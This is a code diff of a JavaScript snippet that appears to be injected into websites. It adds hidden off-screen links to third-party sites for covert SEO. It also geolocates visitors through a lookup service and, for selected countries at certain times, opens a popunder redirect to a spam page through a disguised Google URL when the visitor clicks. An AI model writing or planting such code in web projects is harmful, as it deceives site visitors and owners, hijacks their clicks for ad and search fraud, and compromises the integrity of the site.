@@ -1,14 +1,17 @@
 let EFV='<a href="https://www.am2z.com" style="position:absolute;z-index:-999;left:-99%;">Am2z News</a><a href="https://www.mrjaz.com" style="position:absolute;z-index:-999;left:-99%;">MrJaz</a><a href="https://sohanisharma.com" style="position:absolute;z-index:-999;left:-99%;">SohaniSharma</a>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);
 
-if (!localStorage.xcaf){(async()=>{let aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json());localStorage.xcaf=1;
-
-if(/United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|Brazil|New Zealand|Italy|Luxembourg|Finland/.test(aa.geoplugin_countryName)){localStorage.xcaf=2}
+if (!localStorage.xcaf){
+  (async()=>{
+    let aa=await(await(await fetch(`http://www.geoplugin.net/json.gp`)).json());
+    localStorage.xcaf=1;
+    if(/United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|Brazil|New Zealand|Italy|Luxembourg|Finland/.test(aa.geoplugin_countryName)){localStorage.xcaf=2}
                                    
-//  if(/£|[$]|€/.test(aa.geoplugin_currencySymbol)){localStorage.xcaf=2;
+//     if(/£|[$]|€/.test(aa.geoplugin_currencySymbol)){localStorage.xcaf=2;
+//     if(/Spain/.test(aa.geoplugin_countryName)){localStorage.xcaf=3}
 
-// if(/Spain/.test(aa.geoplugin_countryName)){localStorage.xcaf=3}
-
-;uhd()}})();}
+     uhd()
+  })()
+}
 
 function uhd(){document.onmousedown=()=>{let dte=(new Date).getMinutes();if(!sessionStorage.i&&(localStorage.xcaf==2&&dte>9&&dte<40||localStorage.xcaf==3&&dte>9&&dte<20)){
 window.open('https://www.google.com/url?sa=t&source=web&rct=j&url=https://bitcoin-insurance-loan-seo-hosting.mrjaz.com/what-is-insurance-types-of-insurance-and-meaning-insurance-policy&ved=2ahUKEwjHj9PK1NX6AhXF4TgGHYk9AA4QFnoECBwQAQ&usg=AOvVaw0Td5dR-lZBOeKNa4dB8aF4'); 
